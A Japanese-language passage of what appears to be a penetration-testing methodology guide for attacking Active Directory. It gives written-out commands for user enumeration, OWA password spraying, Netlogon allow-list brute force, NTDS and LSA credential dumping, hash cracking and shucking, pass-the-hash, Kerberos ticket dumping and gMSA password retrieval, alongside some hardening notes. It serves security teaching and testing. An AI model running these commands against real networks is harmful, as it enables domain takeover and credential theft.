# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## 基本概要

**Active Directory** は基盤となるテクノロジーであり、**ネットワーク管理者**がネットワーク内の**ドメイン**、**ユーザー**、**オブジェクト**を効率的に作成・管理できるようにします。大規模なユーザー群を管理しやすい**グループ**や**サブグループ**に整理し、さまざまなレベルで**アクセス権**を管理できるよう、拡張性を備えて設計されています。

**Active Directory** の構造は、主に**ドメイン**、**ツリー**、**フォレスト**の3つの層で構成されます。**ドメイン**は、共通のデータベースを共有する**ユーザー**や**デバイス**などのオブジェクトの集合です。**ツリー**は共通の構造でリンクされたドメインのグループであり、**フォレスト**は**信頼関係**で相互接続された複数のツリーの集合で、組織構造の最上位層を形成します。これらの各レベルで、特定の**アクセス権**や**通信権限**を設定できます。

**Active Directory** の主な概念は次のとおりです。

1. **ディレクトリ** – Active Directory オブジェクトに関するすべての情報を格納します。
2. **オブジェクト** – ディレクトリ内のエンティティを指し、**ユーザー**、**グループ**、**共有フォルダー**などが含まれます。
3. **ドメイン** – ディレクトリオブジェクトを格納するコンテナーです。1つの**フォレスト**内に複数のドメインを共存させ、それぞれが独自のオブジェクト群を保持できます。
4. **ツリー** – 共通のルートドメインを共有するドメインのグループです。
5. **フォレスト** – Active Directory の組織構造の頂点であり、相互に**信頼関係**を持つ複数のツリーで構成されます。

**Active Directory Domain Services (AD DS)** には、ネットワーク内の集中管理と通信に不可欠なさまざまなサービスが含まれています。これらのサービスは次のとおりです。

1. **ドメインサービス** – データストレージを一元化し、**認証**や**検索**機能を含む、**ユーザー**と**ドメイン**間のやり取りを管理します。
2. **証明書サービス** – 安全な**デジタル証明書**の作成、配布、管理を行います。
3. **ライトウェイトディレクトリサービス** – **LDAP protocol** を通じて、ディレクトリ対応アプリケーションをサポートします。
4. **ディレクトリフェデレーションサービス** – 1回のセッションで複数の Web アプリケーションにわたってユーザーを認証する**シングルサインオン**機能を提供します。
5. **Rights Management** – 著作物の不正な配布や使用を制限し、著作権で保護されたコンテンツを守ります。
6. **DNS Service** – **ドメイン名**の名前解決に不可欠です。

詳しい説明については、[**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory) を参照してください。

### **Kerberos Authentication**

**AD を攻撃する**方法を学ぶには、**Kerberos authentication process** を十分に**理解**する必要があります。\
[**仕組みをまだ知らない場合は、このページを読んでください。**](kerberos-authentication.md)

## Cheat Sheet

[https://wadcoms.github.io/](https://wadcoms.github.io) で、AD の列挙や悪用に使えるコマンドをすぐに確認できます。

> [!WARNING]
> Kerberos 通信では通常、クライアントが正しい SPN のチケットを取得できるよう、**完全修飾ドメイン名 (FQDN)** が必要です。IP アドレスでマシンにアクセスすると、Kerberos ではなく NTLM にフォールバックすることがよくあります。

## Active Directory の Recon (認証情報/セッションなし)

AD 環境にアクセスできても、認証情報やセッションがない場合は、次のことができます。

- **ネットワークを Pentest する:**
  - ネットワークをスキャンしてマシンと開いているポートを見つけ、**脆弱性を悪用**したり、そこから**認証情報を抽出**したりします (たとえば、[プリンターは非常に興味深いターゲットになり得ます](ad-information-in-printers.md))。
  - DNS を列挙すると、ドメイン内の Web サーバー、プリンター、共有、VPN、メディアなど、重要なサーバーに関する情報を得られる場合があります。
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - 詳細については、一般的な[**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md)を参照してください。
- **smb サービスで null および Guest アクセスを確認する** (最新の Windows バージョンでは機能しません):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - SMB サーバーの列挙方法について、より詳しいガイドはこちらにあります:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **LDAP を列挙する**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - LDAP の列挙方法について、より詳しいガイドはこちらにあります (**anonymous access に特に注意してください**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **ネットワークを Poison する**
  - [**Responder でサービスになりすまして**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)認証情報を収集する
  - [**relay attack を悪用して**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)ホストにアクセスする
  - [**evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) で偽の UPnP サービスを**公開**し、認証情報を収集する
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - 内部文書、ソーシャルメディア、ドメイン環境内のサービス (主に Web)、および公開情報からユーザー名や氏名を抽出する。
  - 会社の従業員の氏名がわかった場合は、さまざまな AD の**ユーザー名規則 (**[**こちらを参照**](https://activedirectorypro.com/active-directory-user-naming-convention/))を試せます。一般的な規則は _NameSurname_、_Name.Surname_、_NamSur_ (各3文字)、_Nam.Sur_、_NSurname_、_N.Surname_、_SurnameName_、_Surname.Name_、_SurnameN_、_Surname.N_、_ランダムな英字3文字と数字3桁_ (abc123) です。
  - ツール:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### ユーザー列挙

- **Anonymous SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) と [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) のページを確認してください。
- **Kerbrute enum**: **無効なユーザー名が要求される**と、サーバーは **Kerberos error** コード _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ を返すため、ユーザー名が無効だと判定できます。**有効なユーザー名**の場合は、**AS-REP の TGT** またはエラー _KRB5KDC_ERR_PREAUTH_REQUIRED_ のいずれかが返されます。このエラーはユーザーに pre-authentication が必要であることを示します。
- **MS-NRPC に対する認証なしの列挙**: ドメインコントローラーの MS-NRPC (Netlogon) インターフェースに対して、auth-level = 1 (No authentication) を使用します。この方法では、MS-NRPC インターフェースにバインドした後、`DsrGetDcNameEx2` 関数を呼び出し、認証情報なしでユーザーまたはコンピューターの存在を確認します。[NauthNRPC](https://github.com/sud0Ru/NauthNRPC) ツールは、この種の列挙を実装しています。調査内容は[こちら](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>で確認できます.

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **OWA (Outlook Web Access) サーバー**

ネットワーク内でこれらのサーバーを見つけた場合は、**user enumeration** も実行できます。たとえば、[**MailSniper**](https://github.com/dafthack/MailSniper) を使用できます。

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> ユーザー名のリストは[**このgithub repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)や、こちらのrepo（[**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)）で見つけることができます。
>
> ただし、この前に実施したreconの段階で、会社で働く人々の**名前**を入手しておくべきです。名と姓がわかれば、[**namemash.py**](https://gist.github.com/superkojiman/11076951)スクリプトを使って、有効な可能性のあるユーザー名を生成できます。

### Netlogonの脆弱なチャネルのallow-list悪用（Onelogon）

DCに**Zerologon**のパッチが適用されていても、明示的にallow-listに登録されたアカウントは、**従来の脆弱なNetlogonセキュアチャネルの挙動**によって、依然として危険にさらされる可能性があります。リスクのある設定は、GPOの**`Domain controller: Allow vulnerable Netlogon secure channel connections`**、または対応するレジストリ値**`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**です。

この値は**SDDLセキュリティ記述子**です（[Security Descriptors](security-descriptors.md)を参照）。DACL内で該当するACEが付与されたアカウントまたはグループは、攻撃対象にできます。たとえば、`O:BAG:BAD:(A;;RC;;;WD)`は実質的に**Everyone**をallow-listに登録します。

実践的なオペレーターの手順：

1. **SYSVOL/GPO**と**稼働中のDCのレジストリ**の両方を確認し、allow-listに登録されたプリンシパルを特定します。
2. SDDL内のSIDを実際のADユーザーやコンピューターに対応付け、**DCのマシンアカウント**、**信頼アカウント**、その他の特権を持つマシンを優先します。
3. allow-listに登録されたアカウントとして、**MS-NRPC / Netlogon認証**を繰り返し試みます。
4. 推測に成功したら、**Netlogonのパスワード設定**を悪用して対象アカウントのパスワードをリセットします（公開PoCでは空文字列に設定します）。<sup>[[9]](#references)[[10]](#references)</sup>

公開されているartifactに基づく簡易トリアージ／ラボの例：

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Notes:

- **scanner**が有用なのは、有効なallow-listが**SYSVOL**、**registry**、またはその両方に存在する可能性があるためです。
- 脆弱なアカウントを特定した後は、**Domain Admin権限を必要とせずに**exploit pathを実行できる点が重要です。
- **DC$**などの**Domain Controllerのmachine account**を侵害するのは特に危険です。このアカウントのパスワードをリセットすると、より広範な**AD takeover**につながる可能性があります。
- **Brute-forceの実現可能性**はmodeによって異なります。公開されているartifactでは、meet-in-the-middle方式、別のcomputer accountが利用できる場合の**24-bit** brute force、より時間のかかる**32-bit**のvariantが説明されています。

Detection / hardeningに関する注意:

- allow-list policyを監査し、一時的かつ明示的に必要な互換性例外以外はすべて削除してください。
- DCの**System**イベント**5827/5828/5829/5830/5831**を監視し、脆弱なNetlogon connectionが拒否、検出、またはpolicyによって明示的に許可されたことを確認してください。
- `VulnerableChannelAllowList`内のアカウントは、legacy dependencyが解消されるまで**high-risk**として扱ってください。

### 1つまたは複数のusernameが分かっている場合

有効なusernameは分かっているが、passwordがない場合は、次を試してください。

- [**ASREPRoast**](asreproast.md): ユーザーに属性 _DONT_REQ_PREAUTH_ が**設定されていない**場合、そのユーザーの**AS_REP messageをリクエスト**できます。このmessageには、ユーザーのpasswordから導出された値で暗号化されたデータが含まれています。
- [**Password Spraying**](password-spraying.md): 発見した各ユーザーに、**よく使われるpassword**を試してみましょう。弱いpasswordを使っているユーザーがいるかもしれません（password policyに注意してください！）。
  - OWA serverに**spray**して、ユーザーのmail serverへのアクセスを試みることもできます。


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

network上のいくつかのprotocolを**poisoning**することで、crack可能なchallenge **hashes**を**取得**できる場合があります。


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directoryのenumerationから、username、email identifier、命名パターン、候補host、認証を強制できる可能性のあるserviceが分かります。これらの情報を使って、有効なNTLM [**relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)と、AD環境への潜在的な侵入経路を特定してください。

### NetExec workspaceを活用したreconとrelay postureの確認

- **`nxcdb` workspace**を使い、engagementごとにAD reconの状態を管理します。`workspace create <name>`を実行すると、protocolごとのSQLite DBが`~/.nxc/workspaces/<name>`に作成されます（smb/mssql/winrm/ldapなど）。`proto smb|mssql|winrm`で表示を切り替え、`creds`で収集したsecretを一覧表示します。作業後は機密データを手動で削除してください：`rm -rf ~/.nxc/workspaces/<name>`。<sup>[[6]](#references)</sup>
- **`netexec smb <cidr>`**でsubnetを手早く調査すると、**domain**、**OS build**、**SMB signing要件**、**Null Auth**が分かります。`(signing:False)`と表示されるmemberは**relayされやすい**一方、DCでは多くの場合signingが必須です。
- NetExecの出力から**`/etc/hosts`にhostnameを生成**し、targetingを容易にします：

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- **SMB relay to the DC が** signing によってブロックされている場合も、**LDAP** の状態を確認します: `netexec ldap <dc>` は `(signing:None)` / weak channel binding を示します。SMB signing が必須でも LDAP signing が無効な DC は、**SPN-less RBCD** のような悪用に使える **relay-to-LDAP** のターゲットであり続けます。

### クライアント側のプリンターからの credential leak → ドメイン全体の credential 一括検証

- プリンターやWeb UIでは、**マスクされた管理者パスワードがHTMLに埋め込まれている**ことがあります。ソースやdevtoolsを確認すると、平文（例: `<input value="<password>">`）が見つかり、Basic-authでスキャン/印刷リポジトリにアクセスできる場合があります。
- 取得した印刷ジョブには、ユーザーごとのパスワードが記載された**平文のオンボーディング文書**が含まれている場合があります。テスト時はユーザーとパスワードの組み合わせを対応させたままにしてください:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### NTLM 認証情報の窃取

**null または guest user**で**他の PC や共有にアクセス**できる場合、（SCF ファイルなどの）ファイルを**配置**できます。そのファイルが何らかの方法でアクセスされると、あなたに対する NTLM 認証を**誘発**し、解析するための **NTLM challenge**を**窃取**できる可能性があります。


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking**では、すでに取得しているすべての NT hash を、NT hash から直接鍵素材が導出される、より低速な形式に対する候補パスワードとして扱います。Kerberos RC4 ticket、NetNTLM challenge、またはキャッシュされた認証情報に対して長いパスフレーズを総当たりする代わりに、NT hash を Hashcat の NT-candidate mode に入力し、平文を知らなくてもパスワードの再利用を検証できます。ドメイン侵害後に、現在および過去の NT hash を数千件取得できた場合、特に有効です。<sup>[[5]](#references)</sup>

次の場合に shucking を使用します。

- DCSync、SAM/SECURITY dump、または認証情報 vault から NT hash のコーパスを取得しており、他の domain/forest での再利用を検証する必要がある。
- RC4 ベースの Kerberos 情報（`$krb5tgs$23$`、`$krb5asrep$23$`）、NetNTLM response、または DCC/DCC2 blob を取得した。
- クラックできない長いパスフレーズの再利用を迅速に証明し、すぐに Pass-the-Hash で侵入を広げたい。

この手法は、鍵が NT hash ではない暗号化タイプ（Kerberos etype 17/18 AES など）には**使えません**。ドメインが AES のみを強制している場合は、通常の password mode に戻す必要があります。

#### NT hash コーパスの作成

- **DCSync/NTDS** – `secretsdump.py` で履歴も含めて取得し、可能な限り多くの NT hash（およびその過去の値）を収集します。

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  History entriesは候補プールを大幅に広げます。Microsoftはアカウントごとに最大24個の過去のハッシュを保存できるためです。NTDS secretsを収集する方法については、以下を参照してください。

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa`（またはMimikatzの`lsadump::sam /patch`）で、ローカルのSAM/SECURITYデータとキャッシュされたドメインログオン情報（DCC/DCC2）を抽出します。重複を除き、これらのハッシュを同じ`nt_candidates.txt`リストに追加します。
- **メタデータを追跡する** – 各ハッシュの取得元となったユーザー名/ドメインを記録しておきます（wordlistに16進数のみが含まれている場合も同様です）。Hashcatが候補を見つけたとき、ハッシュが一致すれば、どのプリンシパルがパスワードを再利用しているかすぐに分かります。
- shucking時に重複する可能性を最大化するため、同じforestまたは信頼関係のあるforestの候補を優先します。

#### HashcatのNT-candidateモード

| Hashの種類                              | Passwordモード | NT-candidateモード |
| --------------------------------------- | -------------- | ------------------ |
| Domain Cached Credentials (DCC)         | 1100           | 31500              |
| Domain Cached Credentials 2 (DCC2)      | 2100           | 31600              |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500           | 27000              |
| NetNTLMv2                                | 5600           | 27100              |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500           | _N/A_              |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100          | 35300              |
| Kerberos 5 etype 23 AS-REP               | 18200          | 35400              |

Notes:

- NT-candidateの入力は**32桁の16進数のNTハッシュのままにする必要があります**。ルールエンジンを無効にしてください（`-r`やhybrid modeは使用しない）。変換処理によって候補のキー素材が破損するためです。
- これらのモード自体が高速というわけではありませんが、NTLMのkeyspace（M3 Maxで約30,000 MH/s）はKerberos RC4（約300 MH/s）より約100倍高速です。厳選したNTリストの検証は、遅い形式でパスワード空間全体を探索するより、はるかに低コストです。
- モード31500/31600/35300/35400は最近追加されたため、必ず**最新のHashcat build**（`git clone https://github.com/hashcat/hashcat && make install`）を使用してください。<sup>[[7]](#references)</sup>
- 現在、AS-REQ Pre-Auth用のNTモードはありません。また、AES etype（19600/19700）では、キーが生のNTハッシュではなく、UTF-16LEパスワードからPBKDF2で導出されるため、平文パスワードが必要です。

#### 例 – Kerberoast RC4（モード35300）

1. 権限の低いユーザーで、対象SPNのRC4 TGSをキャプチャします（詳細はKerberoastのページを参照してください）。

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. NT listを使ってticketをshuckします:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcatは各NT候補からRC4キーを導出し、`$krb5tgs$23$...` blobを検証します。一致すれば、そのサービスアカウントが既存のNT hashのいずれかを使用していることが確認できます。

3. PtHで直ちに横展開します:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   必要であれば、後で `hashcat -m 1000 <matched_hash> wordlists/` を使って平文を復元できます。

#### 例 – キャッシュされた認証情報（mode 31600）

1. 侵害したワークステーションからキャッシュされたログオン情報をダンプします:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. 対象となるドメインユーザーのDCC2行を`dcc2_highpriv.txt`にコピーして、shuckします。

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. 一致に成功すると、リスト内ですでに判明しているNT hashが得られ、キャッシュされたユーザーがパスワードを再利用していることが証明されます。これをそのままPtHに使う（`nxc smb <dc_ip> -u highpriv -H <hash>`）か、高速なNTLMモードでbrute-forceしてパスワード文字列を復元します。

NetNTLM challenge-response（`-m 27000/27100`）とDCC（`-m 31500`）にも、まったく同じ手順を適用できます。一致が見つかったら、relay、SMB/WMI/WinRM PtHを実行するか、オフラインでマスクやルールを使ってNT hashを再度crackできます。



## 認証情報/セッションを使用したActive Directoryの列挙

このフェーズでは、**有効なドメインアカウントの認証情報またはセッションを侵害している必要があります。** 有効な認証情報を持っている場合や、ドメインユーザーとしてshellを取得している場合でも、**前述の手法を使ってほかのユーザーを侵害できることを忘れないでください。**

認証済みの列挙を始める前に、**Kerberos double-hop問題**を理解してください。


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### 列挙

アカウントの侵害は、**ドメインの評価に向けた大きな一歩**です。認証済みの**Active Directory列挙**が可能になるためです。

[**ASREPRoast**](asreproast.md)では、脆弱な可能性があるユーザーをすべて見つけられます。また、[**Password Spraying**](password-spraying.md)では、**すべてのユーザー名のリスト**を取得し、侵害したアカウントのパスワード、空のパスワード、新たに見つかった有望なパスワードを試すことができます。

- [**基本的なreconを行うCMD**](../basic-cmd-for-pentesters.md#domain-info)を使用できます。
- [**reconにpowershellを使う**](../basic-powershell-for-pentesters/index.html)こともできます。こちらのほうがステルス性に優れています。
- [**powerviewを使う**](../basic-powershell-for-pentesters/powerview.md)ことで、さらに詳しい情報を抽出できます。
- Active Directoryのreconに使える優れたツールとして、[**BloodHound**](bloodhound.md)もあります。**ステルス性は高くありません**（使用する収集方法によります）が、**気にしないのであれば**ぜひ試してみてください。ユーザーがRDPできる場所や、ほかのグループへの経路などを見つけられます。
  - **その他の自動AD列挙ツール:** [**AD Explorer**](bloodhound.md#ad-explorer)**、** [**ADRecon**](bloodhound.md#adrecon)**、** [**Group3r**](bloodhound.md#group3r)**、** [**PingCastle**](bloodhound.md#pingcastle)**。**
- 興味深い情報が含まれている可能性があるため、[**ADのDNSレコード**](ad-dns-records.md)も確認してください。
- ディレクトリの列挙には、**SysInternal** Suiteの**AdExplorer.exe**という**GUIツール**も使えます。
- **ldapsearch**でLDAPデータベースを検索し、_userPassword_や_unixUserPassword_フィールド、またはユーザーの_description_や_info_のメモに認証情報がないか調べることもできます。_info_内にラベルのないパスワード形式の文字列があっても、それは候補にすぎません。用途と有効性は個別に確認し、通常の列挙出力にメモの内容を含めないでください。ほかの手法については、PayloadsAllTheThingsの[ADユーザーコメント内のパスワード](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment)を参照してください。
- 許可されている場合は、`\\<dc>\NETLOGON`または`\\<dc>\SYSVOL\<domain>\scripts`にある、**アクセス可能な**ドメインログオンスクリプトやドライブマッピングスクリプトを確認してください。[Microsoftのドキュメント](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller)では、NETLOGON共有がスクリプトディレクトリとして果たす役割が説明されています。最初に名前を一覧表示し、その後、関連性があり読み取り可能なスクリプトだけをサイズ制限内で確認してください。通常の列挙で共有全体をダンプしたり、認証情報の値を表示したりしないでください。PowerShellの[`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring)を呼び出しても、スクリプトに保存された平文のパスワードは保護されません。ただし、この呼び出しだけではsecretがハードコードされている証拠にはなりません。実際の入力元を追跡し、アカウント、認証情報の有効性、権限をそれぞれ別途確認してください。ドメインスクリプトの確認はリモート共有の調査であり、ローカルホストの列挙とは別です。
- **Linux**を使っている場合は、[**pywerview**](https://github.com/the-useless-one/pywerview)でドメインを列挙することもできます。
- 次のような自動化ツールも試せます。
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **すべてのドメインユーザーの抽出**

  Windowsでは、すべてのドメインユーザー名を簡単に取得できます（`net user /domain`、`Get-DomainUser`、または`wmic useraccount get name,sid`）。Linuxでは、次のコマンドを使えます。`GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username`または`enum4linux -a -u "user" -p "password" <DC IP>`

> この列挙セクションは短く見えるかもしれませんが、全体の中で最も重要な部分です。リンク（特にcmd、powershell、powerview、BloodHoundのリンク）を開き、ドメインの列挙方法を学び、自信がつくまで練習してください。評価の際、ここがDAへの道を見つける鍵となる瞬間であり、何もできないと判断する場面でもあります。

### 予測可能な事前作成コンピューターアカウント -> gMSA passwordへのアクセス

レガシーなドメイン参加用に事前作成されたコンピューターアカウントは、予測可能な初期パスワードのままになっていることがあります。NetExecの`pre2k`モジュールは、特徴的な`userAccountControl`の値`4128`（`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`）を特定し、末尾の`$`を除いたコンピューター名の小文字表記の先頭14文字を使ってKerberos TGTを試みます。このUAC値は候補を絞り込むための指標として扱ってください。**Pre-Windows 2000 Compatible Access**のメンバーであることだけを根拠に、パスワードが弱いと決めつけないでください。<sup>[[18]](#references)[[20]](#references)</sup>

認証済みLDAP列挙を使って候補をテストし、成功したTGTを保存してください。`ALL=True`を指定すると、デフォルトの`4128`フィルターに一致するオブジェクト以外もテスト対象になります。<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

デフォルト/NTLM bind に失敗しても、この finding が無効になるわけではありません。`-k`、DC に名前解決される FQDN、KDC と同期したクロックを使ってテストしてください。モジュールの実行に成功すると、候補リストと取得した ccaches が `~/.nxc/modules/pre2k/` 以下に書き込まれます。<sup>[[18]](#references)[[20]](#references)</sup>

computer principal を侵害した後は、そのネストされたグループメンバーシップと外向きの権限をグラフ化してください。特に、gMSA の `msDS-GroupMSAMembership` セキュリティ記述子に記載された principal は `msDS-ManagedPassword` を読み取れます。NetExec の `--gmsa` 出力には許可された principal が表示され、認証に使う computer が許可されている場合は、現在の NT hash が返されます。<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

復元した gMSA は、他の認証情報と同様に評価します。ローカル／ドメインのグループメンバーシップ、ログオン権限、SPN、委任、アクセス可能なサービスを調べてから、pass-the-hash を試してください。この ACL ベースの取得経路は、KDS root key の侵害後に管理パスワードを導出する [Golden gMSA/dMSA](golden-dmsa-gmsa.md) とは異なります。<sup>[[20]](#references)</sup>

コンピュータープリンシパルが、他のコンピューターオブジェクトやグループを外部から制御できる場合もあります。取得後は、ネストされたメンバーシップと有効な ACL を個別に調べてください。別のコンピューターオブジェクトへの書き込み権限があればアカウントを変更できる場合があり、グループメンバーシップに関する権限があればログオンロールにつながる場合があります。ステージングアカウントのフラグ、予測可能な命名規則、または `GenericWrite` のエッジだけでは、経路全体が成立する証拠にはなりません。

ファイル、共有、バックアップ内にある `msDS-ManagedPassword` blob の読み取り可能なコピーは、別の漏えい経路です。LDAP の読み取り ACL では、別の場所に保存されたコピーを保護できません。データを解釈する前に、管理パスワードの blob であることを検証し、認可された LDAP 読み取りや KDS root key からの導出とは区別してください。

### Kerberoast

Kerberoasting では、ユーザーアカウントに紐づくサービスが使用する **TGS tickets** を取得し、ユーザーパスワードに基づく暗号化を **offline** でクラックします。

詳細はこちら:


{{#ref}}
kerberoast.md
{{#endref}}

### リモート接続（RDP、SSH、FTP、Win-RM など）

認証情報を取得したら、**マシン**にアクセスできるか確認します。その際、ポートスキャンの結果に応じて、**CrackMapExec** を使い、異なるプロトコルで複数のサーバーへの接続を試すことができます。

### ローカル権限昇格

認証情報、または通常のドメインユーザーとしてのセッションを侵害し、ドメイン内の**いずれかのマシン**にアクセスできる場合は、**ローカルで権限を昇格し、認証情報を収集する**方法を探してください。ローカル管理者権限があれば、メモリ（LSASS）やローカルストレージ（SAM）から**他のユーザーのハッシュをダンプ**できる場合があります。

この書籍には、[**Windows のローカル権限昇格**](../windows-local-privilege-escalation/index.html)についてのページと、[**チェックリスト**](../checklist-windows-privilege-escalation.md)があります。また、[**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) も忘れずに使用してください。

### 現在のセッションのチケット

現在のユーザーの**チケット**に、予期しないリソースへのアクセスを許可するものが含まれている可能性は非常に**低い**ですが、確認してみてもよいでしょう。

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

ドメインの認証情報またはユーザーセッションがある場合は、NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)を再確認しましょう。認証済みの列挙や強制認証の手法を使うと、未認証の偵察では利用できなかった中継経路が見つかることがあります。

### コンピューター共有 | SMB 共有内の認証情報を探す

基本的な認証情報を入手したら、**AD 内で共有されている興味深いファイルを見つけられるか**確認しましょう。手動でもできますが、非常に退屈で反復的な作業です（確認が必要なドキュメントが何百個も見つかった場合はなおさらです）。

[**使用できるツールについては、このリンクを参照してください。**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### NTLM 認証情報を窃取する

**他の PC や共有にアクセスできる**場合は、ファイル（SCF ファイルなど）を**配置**できます。そのファイルに何らかの方法でアクセスされると、あなたに対する NTLM 認証を**発生させ、NTLM challenge を窃取**してクラックできる可能性があります。


{{#ref}}
